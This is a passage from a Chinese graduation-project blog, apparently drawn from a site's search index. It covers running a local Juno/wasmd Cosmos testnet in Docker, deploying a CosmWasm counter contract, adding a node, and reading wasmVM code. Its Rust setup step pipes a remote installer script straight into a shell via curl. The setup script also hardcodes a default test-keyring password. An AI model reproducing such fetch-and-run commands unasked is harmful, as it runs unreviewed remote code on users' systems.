&lt;address&gt;</span><br></pre></td></tr></table></figure>\n<p>或合并成一行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query bank balances $(junod keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<h3 id=\"validator-转账\">2 validator 转账</h3>\n<p>如果你是按照第一步运行区块链的，那么区块链在创建之初，就已经分配了一个名外\n<code>validator</code> 的账户，有很多初始资产\n<code>1000000000ustake,1000000000ujuno</code> 。</p>\n<p>现在让 validator 给 mywallet 进行转账。</p>\n<p>（这一步不能在本地执行，因为 validator 的账户信息存放在 docker\n容器里，没有账户的私钥是无法让它转账的）</p>\n<p>进入 docker ，执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx bank send validator &lt;recipient_address&gt; \\</span><br><span class=\"line\">\t100000ucosm --fees 200ustake --chain-id testing --keyring-backend <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>将 <code>&lt;recipient_address&gt;</code> 替换为你的钱包地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx bank send validator juno1ddtgryk2xgt3qlsrx8z2kat9gpluw8886wpwhu 100000ucosm --fees 200ustake --chain-id testing --keyring-backend <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\">junod tx bank send validator juno1ddtgryk2xgt3qlsrx8z2kat9gpluw8886wpwhu 100000ustake --fees 200ustake --chain-id testing --keyring-backend <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>如果执行成功，可以在本地查询到你的资产：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query bank balances $(junod keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">balances:</span><br><span class=\"line\">- amount: <span class=\"string\">\"100000\"</span></span><br><span class=\"line\">  denom: ucosm</span><br><span class=\"line\">- amount: <span class=\"string\">\"100000\"</span></span><br><span class=\"line\">  denom: ustake</span><br><span class=\"line\">pagination:</span><br><span class=\"line\">  next_key: null</span><br><span class=\"line\">  total: <span class=\"string\">\"0\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"部署和调用智能合约\">2.2 部署和调用智能合约</h2>\n<h3 id=\"前置步骤\">0 前置步骤</h3>\n<p>安装 rust 环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class=\"line\">sudo apt install curl build-essential -y</span><br><span class=\"line\">curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n<p>检查是否安装成功：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rustc --version</span><br><span class=\"line\">cargo --version</span><br></pre></td></tr></table></figure>\n<p>安装 <code>cargo</code> 和 <code>wasm</code> 编译工具链，用于编译\nRust 智能合约：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rustup default stable</span><br><span class=\"line\">rustup target add wasm32-unknown-unknown</span><br></pre></td></tr></table></figure>\n<p>确保你有一个账户（例如\n<code>mywallet</code>）并且有足够的资产来支付部署和调用费用。</p>\n<h3 id=\"创建合约项目\">1 创建合约项目</h3>\n<p>如果未安装 <code>cargo-generate</code>，请运行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cargo install cargo-generate --locked</span><br></pre></td></tr></table></figure>\n<p>使用模板创建项目：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cargo generate --git https://github.com/CosmWasm/cw-template.git --name simple_counter</span><br><span class=\"line\">cd simple_counter</span><br></pre></td></tr></table></figure>\n<p>这将获取一个<strong>简单计数器</strong>智能合约。</p>\n<h3 id=\"编译智能合约\">2 编译智能合约</h3>\n<h4 id=\"编译未优化\">编译（未优化）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cargo wasm</span><br></pre></td></tr></table></figure>\n<p>得到编译好的wasm文件\n<code>./target/wasm32-unknown-unknown/release/simple_counter.wasm</code></p>\n<h4 id=\"编译并优化\">编译并优化</h4>\n<p>只要不超过大小限制， Juno 支持上传未优化的\nwasm。但是为了减少合约的大小，以节省区块链上的存储成本和提高加载效率，通常需要对\nwasm 文件进行<strong>优化</strong>。</p>\n<p>cosmwasm\n提供了一个优化器，封装了<strong>编译和优化</strong>的全过程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull cosmwasm/optimizer:0.16.0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 确保位于智能合约项目的根目录</span></span><br><span class=\"line\">docker run --<span class=\"built_in\">rm</span> -v <span class=\"string\">\"<span class=\"subst\">$(pwd)</span>\"</span>:/code cosmwasm/optimizer:0.16.0</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>-v \"$(pwd)\":/code</code> 将当前目录挂载到容器中的 /code\n目录。</li>\n<li>镜像会自动构建和优化你的智能合约，并输出优化后的 .wasm 文件到项目的\nartifacts 目录中。</li>\n</ul>\n<p>但是有两个问题：</p>\n<ol type=\"1\">\n<li>下载速度很慢，甚至有 crate\n下载失败，可能docker镜像不能走我宿主机的代理？</li>\n<li>每次启动都得下载，效率太低。</li>\n</ol>\n<p>为了解决这些问题：</p>\n<ol type=\"1\">\n<li><p>使用共享 Cargo 缓存</p>\n<p>将宿主机的 Cargo\n缓存目录挂载到容器中，这样即使重新运行也能复用已下载的依赖：</p>\n<p><code>-v \"$HOME/.cargo/registry\":/usr/local/cargo/registry</code>\n：挂载依赖缓存。</p>\n<p><code>-v \"$HOME/.cargo/git\":/usr/local/cargo/git</code>：挂载 Git\n缓存。</p></li>\n<li><p>运行 docker run 时传递代理环境变量：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">-e HTTP_PROXY=http://your-proxy:port</span><br><span class=\"line\">-e HTTPS_PROXY=http://your-proxy:port </span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<p>完整的命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --<span class=\"built_in\">rm</span> -v <span class=\"string\">\"<span class=\"subst\">$(pwd)</span>\"</span>:/code \\</span><br><span class=\"line\">    -v <span class=\"string\">\"<span class=\"variable\">$HOME</span>/.cargo/registry\"</span>:/usr/local/cargo/registry \\</span><br><span class=\"line\">    -v <span class=\"string\">\"<span class=\"variable\">$HOME</span>/.cargo/git\"</span>:/usr/local/cargo/git \\</span><br><span class=\"line\">    -e HTTP_PROXY=http://192.168.3.56:21882 \\</span><br><span class=\"line\">    -e HTTPS_PROXY=http://192.168.3.56:21882 \\</span><br><span class=\"line\">    cosmwasm/optimizer:0.16.0</span><br></pre></td></tr></table></figure>\n<p>此时在 <code>./artifacts</code> 中得到了优化后的 wasm\n文件，文件缩小了约 25%：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">240K    simple_counter.wasm(优化前)</span><br><span class=\"line\">184K    simple_counter.wasm(优化后)</span><br></pre></td></tr></table></figure>\n<h3 id=\"部署智能合约\">3 部署智能合约</h3>\n<h4 id=\"上传合约\">3.1 <strong>上传合约</strong>：</h4>\n<p>（注意需要 mywallet 钱包里有足够的钱）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx wasm store simple_counter.wasm --from mywallet --gas 2000000 --fees 50000ustake</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>gas</code> 表示交易执行所允许的最大 Gas 单位数量。</li>\n<li><code>fees</code> 是为交易支付的手续费。</li>\n</ul>\n<p>最后会返回 <code>txhash</code> ，根据 <code>txhash</code>\n查询结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query tx &lt;txhash&gt; --output json | jq '.raw_log | fromjson'</span><br></pre></td></tr></table></figure>\n<p>记录其中的 <code>code_id</code> 。</p>\n<h4 id=\"实例化合约\">3.2 <strong>实例化合约</strong></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx wasm instantiate &lt;code_id&gt; <span class=\"string\">'{\"count\":0}'</span> --from mywallet --label <span class=\"string\">\"Simple Counter\"</span> --gas 200000 --fees 5000ustake --admin $(junod keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx wasm instantiate 1 <span class=\"string\">'{\"count\":0}'</span> --from mywallet --label <span class=\"string\">\"Simple Counter\"</span> --gas 200000 --fees 5000ustake --admin $(junod keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>--admin</code> 指定一个管理员账户</li>\n<li>或者设置 <code>--no-admin</code>\n表示合约不可更改，一旦部署，任何人都不能升级或迁移该合约。</li>\n</ul>\n<p>根据 <code>txhash</code> 查询结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query tx &lt;txhash&gt; --output json | jq '.raw_log | fromjson'</span><br></pre></td></tr></table></figure>\n<p>记录其中的 <code>_contract_address</code> ，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">juno14hj2tavq8fpesdwxxcu44rty3hh90vhujrvcmstl4zr3txmfvw9skjuwg8</span><br></pre></td></tr></table></figure>\n<h4 id=\"调用合约方法\">3.3 <strong>调用合约方法</strong></h4>\n<ul>\n<li><p><strong>增加计数器的值</strong>：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx wasm execute &lt;contract_address&gt; <span class=\"string\">'{\"increment\":{}}'</span> --from mywallet --gas 200000 --fees 5000ustake</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tx wasm execute juno14hj2tavq8fpesdwxxcu44rty3hh90vhujrvcmstl4zr3txmfvw9skjuwg8 <span class=\"string\">'{\"increment\":{}}'</span> --from mywallet --gas 200000 --fees 5000ustake</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>查询计数器的值</strong>：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query wasm contract-state smart &lt;contract_address&gt; <span class=\"string\">'{\"get_count\":{}}'</span></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query wasm contract-state smart juno14hj2tavq8fpesdwxxcu44rty3hh90vhujrvcmstl4zr3txmfvw9skjuwg8 <span class=\"string\">'{\"get_count\":{}}'</span></span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<p>尝试多次增加计数器的值，查看返回结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">data:</span><br><span class=\"line\">  count: 2</span><br></pre></td></tr></table></figure>\n<table>\n<colgroup>\n<col style=\"width: 19%\">\n<col style=\"width: 18%\">\n<col style=\"width: 20%\">\n<col style=\"width: 22%\">\n<col style=\"width: 18%\">\n</colgroup>\n<thead>\n<tr>\n<th><strong>操作类型</strong></th>\n<th><strong>是否消耗 Gas</strong></th>\n<th><strong>是否支付手续费</strong></th>\n<th><strong>是否改变链上状态</strong></th>\n<th><strong>是否需要签名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>查询（<code>query</code>）</td>\n<td>否</td>\n<td>否</td>\n<td>否</td>\n<td>否</td>\n</tr>\n<tr>\n<td>执行（<code>execute</code>）</td>\n<td>是</td>\n<td>是</td>\n<td>是</td>\n<td>是</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"增加新节点\">2.3 增加新节点</h2>\n<p>新增一个节点，加入这个区块链。使用本地的多个 docker\n容器模拟多个独立的节点。</p>\n<h3 id=\"初始化新节点\">1 初始化新节点</h3>\n<p>用之前配置好的镜像 my_juno25 启动一个新的 docker\n容器。（记得换一个端口映射）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -p 26658:26657 --name my-juno-local-2 my_juno25 /bin/sh</span><br></pre></td></tr></table></figure>\n<p>初始化新节点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod init &lt;new_node_name&gt; --chain-id &lt;existing_chain_id&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod init node002 --chain-id testing</span><br></pre></td></tr></table></figure>\n<h3 id=\"复制创世区块\">2 复制创世区块</h3>\n<p>从主节点（现有节点）获取 <code>genesis.json</code>\n文件，并复制到新节点的配置目录。在宿主机中使用\n<code>docker cp</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p ~/tmp/</span><br><span class=\"line\">docker cp my-juno-local:/root/.juno/config/genesis.json /root/tmp/</span><br><span class=\"line\">docker cp /root/tmp/genesis.json my-juno-local-2:/root/.juno/config/</span><br></pre></td></tr></table></figure>\n<h3 id=\"设置种子节点\">3 设置种子节点</h3>\n<p>种子节点是区块链网络中特定设置的几个稳定的节点，能保持在线状态并提供稳定的连接。新节点通过和种子节点建立P2P连接，来加入区块链网络。</p>\n<p>在我们这个例子里，种子节点就是第一个创建的主节点。</p>\n<p>修改 <code>~/.juno/config/config.toml</code> 中的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi ~/.juno/config/config.toml </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">seeds = \"&lt;node_id&gt;@&lt;ip_address&gt;:26656\"</span><br></pre></td></tr></table></figure>\n<p>其中 <code>node_id</code> 是种子节点的 id，在 my-juno-local\n镜像中执行如下命令获取节点 id：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod tendermint show-node-id</span><br></pre></td></tr></table></figure>\n<p>ip地址，使用 docker 的默认虚拟网络，在主节点中执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip addr</span><br></pre></td></tr></table></figure>\n<p>如果主节点是第一个 docker 容器，应该是 <code>172.17.0.2</code>\n。（也可以自定义新的docker network，不在此赘述）</p>\n<p>最终修改为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">seeds = \"4a47e5f773f7012fd82ea195be94ace24bca13ca@172.17.0.2:26656\"</span><br></pre></td></tr></table></figure>\n<p>或者使用一行指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i 's/^seeds = \"\"/seeds = \"&lt;node_id&gt;@&lt;ip_address&gt;:26656\"/' ~/.juno/config/config.toml</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i 's/^seeds = \"\"/seeds = \"4a47e5f773f7012fd82ea195be94ace24bca13ca@172.17.0.2:26656\"/' ~/.juno/config/config.toml</span><br></pre></td></tr></table></figure>\n<h3 id=\"启动新节点\">4 启动新节点</h3>\n<p>使用 <code>run_junod.sh</code> 脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /opt</span><br><span class=\"line\">./run_junod.sh</span><br></pre></td></tr></table></figure>\n<p>会开始同步区块链数据，直到同步到最近的节点。</p>\n<h3 id=\"验证新节点\">5 验证新节点</h3>\n<p>在宿主机中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:26658/status</span><br></pre></td></tr></table></figure>\n<p>向新的节点发起查询请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query wasm contract-state smart &lt;contract_address&gt; '{\"get_count\":{}}' \\</span><br><span class=\"line\">\t--node \"tcp://localhost:26658\"</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结-1\">总结</h1>\n<p>至此，终于运行了一个 cosmos 区块链，并且在上面部署运行了 Wasm\n智能合约。</p>\n<p>最后，我发现 Juno 是在 wasmd 的基础上开发的，我误打误撞从 Juno\n开始学习了。本文的内容几乎可以直接迁移到 wasmd 使用和学习中。</p>\n<p>之后的任务是：</p>\n<ol type=\"1\">\n<li>如何把 Wasm 模块单独拿出来，例如把 CosmWasm\n的虚拟机放到另一个服务器上，让节点通过远程调用的方式执行智能合约。</li>\n<li>把 CosmWasm 虚拟机移植到 TEE 中。</li>\n</ol>\n<p>明天先继续写专利。</p>\n","categories":["笔记"],"tags":["毕设","Cosmos","Juno","CosmWasm","wasmd"]},{"title":"毕设11 - 解耦 CosmWasm 模块","url":"/graduation-project/11/","content":"<p>现在要理解 Cosmos 的运作机制，把 CosmWasm 模块解耦。即节点本身不执行\nWasm 智能合约，通过发送请求调用远程智能合约虚拟机，获取返回结果。</p>\n<p>先重新跑一下 wasmd 。</p>\n<span id=\"more\"></span>\n<h1 id=\"重新跑-wasmd\">1 重新跑 wasmd</h1>\n<h2 id=\"修改客户端配置\">1.1 修改客户端配置</h2>\n<p><code>~/.wasmd/config/client.toml</code> 中设置了 <code>wasmd</code>\n作为客户端的配置，将其修改为：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">chain-id</span> = <span class=\"string\">\"testing\"</span></span><br><span class=\"line\"><span class=\"attr\">keyring-backend</span> = <span class=\"string\">\"test\"</span></span><br><span class=\"line\"><span class=\"attr\">output</span> = <span class=\"string\">\"text\"</span></span><br><span class=\"line\"><span class=\"attr\">node</span> = <span class=\"string\">\"tcp://localhost:26657\"</span></span><br><span class=\"line\"><span class=\"attr\">broadcast-mode</span> = <span class=\"string\">\"sync\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"运行脚本\">1.2 运行脚本</h2>\n<p><code>setup_wasmd.sh</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\">#set -o errexit -o nounset -o pipefail</span></span><br><span class=\"line\"></span><br><span class=\"line\">PASSWORD=<span class=\"variable\">${PASSWORD:-1234567890}</span></span><br><span class=\"line\">STAKE=<span class=\"variable\">${STAKE_TOKEN:-ustake}</span></span><br><span class=\"line\">FEE=<span class=\"variable\">${FEE_TOKEN:-ucosm}</span></span><br><span class=\"line\">CHAIN_ID=<span class=\"variable\">${CHAIN_ID:-testing}</span></span><br><span class=\"line\">MONIKER=<span class=\"variable\">${MONIKER:-node001}</span></span><br><span class=\"line\"></span><br><span class=\"line\">wasmd init --chain-id <span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$MONIKER</span>\"</span></span><br><span class=\"line\"><span class=\"comment\"># staking/governance token is hardcoded in config, change this</span></span><br><span class=\"line\">sed -i <span class=\"string\">\"s/\\\"stake\\\"/\\\"<span class=\"variable\">$STAKE</span>\\\"/\"</span> <span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.wasmd/config/genesis.json</span><br><span class=\"line\"><span class=\"comment\"># this is essential for sub-1s block times (or header times go crazy)</span></span><br><span class=\"line\">sed -i <span class=\"string\">'s/\"time_iota_ms\": \"1000\"/\"time_iota_ms\": \"10\"/'</span> <span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.wasmd/config/genesis.json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ! wasmd keys show validator; <span class=\"keyword\">then</span></span><br><span class=\"line\">  (<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | wasmd keys add validator</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"comment\"># hardcode the validator account for this instance</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span> | wasmd genesis add-genesis-account validator <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># (optionally) add a few more genesis accounts</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> addr <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$@</span>\"</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"variable\">$addr</span></span><br><span class=\"line\">  wasmd genesis add-genesis-account <span class=\"string\">\"<span class=\"variable\">$addr</span>\"</span> <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># submit a genesis validator tx</span></span><br><span class=\"line\"><span class=\"comment\">## Workraround for https://github.com/cosmos/cosmos-sdk/issues/8251</span></span><br><span class=\"line\">(<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | wasmd genesis gentx validator <span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span> --chain-id=<span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> --amount=<span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span></span><br><span class=\"line\"><span class=\"comment\">## should be:</span></span><br><span class=\"line\"><span class=\"comment\"># (echo \"$PASSWORD\"; echo \"$PASSWORD\"; echo \"$PASSWORD\") | wasmd gentx validator \"250000000$STAKE\" --chain-id=\"$CHAIN_ID\"</span></span><br><span class=\"line\">wasmd genesis collect-gentxs</span><br></pre></td></tr></table></figure>\n<p><code>run_wasmd.sh</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -n <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span>; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"comment\"># need -R not -r to copy hidden files</span></span><br><span class=\"line\">    <span class=\"built_in\">cp</span> -R <span class=\"string\">\"<span class=\"variable\">$1</span>/.wasmd\"</span> /root</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /root/log</span><br><span class=\"line\">wasmd start --rpc.laddr tcp://0.0.0.0:26657 --trace</span><br></pre></td></tr></table></figure>\n<p>运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./setup_wasmd.sh</span><br><span class=\"line\">./run_wasmd.sh</span><br></pre></td></tr></table></figure>\n<p>之后修改完代码后，重新编译：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd path/to/wasmd</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n<h1 id=\"分析代码\">2 分析代码</h1>\n<h2 id=\"上传智能合约\">2.1 上传智能合约</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wasmd tx wasm store simple_counter.wasm --from mywallet --gas 2000000 --fees 50000ustake</span><br></pre></td></tr></table></figure>\n<p>这段代码会向区块链发出一个 StoreCode 的事务。</p>\n<p>当节点接收到这个事务后，会调用 wasmVM\n，把智能合约缓存在本地。这个过程并不是在区块链节点的 Go\n代码，而是虚拟机的 Rust 代码。核心代码：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">save_wasm_unchecked</span>(&amp;<span class=\"keyword\">self</span>, wasm: &amp;[<span class=\"type\">u8</span>]) <span class=\"punctuation\">-&gt;</span> VmResult&lt;Checksum&gt; {</span><br><span class=\"line\">    <span class=\"comment\">// We need a new engine for each Wasm -&gt; module compilation due to the metering middleware.</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">compiling_engine</span> = <span class=\"title function_ invoke__\">make_compiling_engine</span>(<span class=\"literal\">None</span>);</span><br><span class=\"line\">    <span class=\"comment\">// This module cannot be executed directly as it was not created with the runtime engine</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">module</span> = <span class=\"title function_ invoke__\">compile</span>(&amp;compiling_engine, wasm)?;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">cache</span> = <span class=\"keyword\">self</span>.inner.<span class=\"title function_ invoke__\">lock</span>().<span class=\"title function_ invoke__\">unwrap</span>();</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">checksum</span> = <span class=\"title function_ invoke__\">save_wasm_to_disk</span>(&amp;cache.wasm_path, wasm)?;</span><br><span class=\"line\">    cache.fs_cache.<span class=\"title function_ invoke__\">store</span>(&amp;checksum, &amp;module)?;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">Ok</span>(checksum)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>最终结果是，节点所在的主机中会保存两个文件：</p>\n<ol type=\"1\">\n<li><p>智能合约原始字节码（.wasm文件）</p>\n<p>位于\n<code>~/.wasmd/wasm/wasm/state/wasm/&lt;字节码的checksum&gt;.wasm</code></p></li>\n<li><p>wasm 编译后的模块（module）</p>\n<p>位于\n<code>~/.wasmd/wasm/wasm/cache/modules/5b35f8ce52-wasmer7/x86_64-unknown-linux-gnu-A91CB5FD/&lt;字节码的checksum&gt;.wasm</code></p></li>\n</ol>\n<h2 id=\"实例化智能合约\">2.2 实例化智能合约</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wasmd tx wasm instantiate 1 <span class=\"string\">'{\"count\":0}'</span> --from validator --label <span class=\"string\">\"Simple Counter\"</span> --gas 200000 --fees 5000ustake --admin $(junod keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<p>实例化，会在区块链上创建一个新的合约地址，之后通过这个地址与该合约交互。</p>\n<p>合约的状态会存储在区块链的 KVStore\n里，通过一个唯一前缀来划分专属这个合约实例的存储区域。</p>\n<p>之后，会调用虚拟机执行智能合约的 <code>instantiate</code>\n函数：（<code>keeper.go 337</code>）</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">res, gasUsed, err := k.wasmVM.Instantiate(codeInfo.CodeHash, env, info, initMsg, vmStore, cosmwasmAPI, querier, k.gasMeter(sdkCtx), gasLeft, costJSONDeserialization)</span><br></pre></td></tr></table></figure>\n<p>WasmVM 由两部分组成：</p>\n<ul>\n<li><p>go语言编写的转发API。</p>\n<p>k.wasmVM.Instantiate 调用的就是 go 语言编写的\nAPI。这个API最终会把请求转发给 Rust 编写的函数。</p></li>\n<li><p>libwasmvm，Rust 编写的虚拟机具体实现。这个例子里，就是\n<code>calls.rs</code> 中的：</p>\n<p><figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">extern</span> <span class=\"string\">\"C\"</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">instantiate</span></span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<p>libwasmvm 的执行逻辑：</p>\n<ul>\n<li><p>从 cache 中获取编译好的模块。</p></li>\n<li><p>将模块实例化（wasmer）。</p></li>\n<li><p>实例化后的模块可以执行内部的的函数：</p>\n<p><figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">call_raw</span>(</span><br><span class=\"line\">    instance,</span><br><span class=\"line\">    <span class=\"string\">\"instantiate\"</span>,</span><br><span class=\"line\">    &amp;[env, info, msg],</span><br><span class=\"line\">    read_limits::RESULT_INSTANTIATE,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p></li>\n</ul>\n<h1 id=\"推进不下去\">推进不下去</h1>\n<p>直接分离虚拟机这一步跨度太大，已经好几天下不去手了。</p>\n<p>先试试直接在虚拟机里运行Wasm智能合约。可以获取一些性能数据。</p>\n<p>然后再想办法把虚拟机移植到TEE里。获取一些性能数据。</p>\n<p>最后一步，才是把节点在区块链上跑起来，然后套之前的模板，实现零知识证明的验证。</p>\n","categories":["笔记"],"tags":["毕设","Cosmos","CosmWasm","wasmd"]},{"title":"毕设12 - SWT系统实现","url":"/graduation-project/12/","content":"<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dhc21lcmlvL3dhc21lci9pc3N1ZXMvMjE3\">github issue:\nno std mode<i class=\"fa 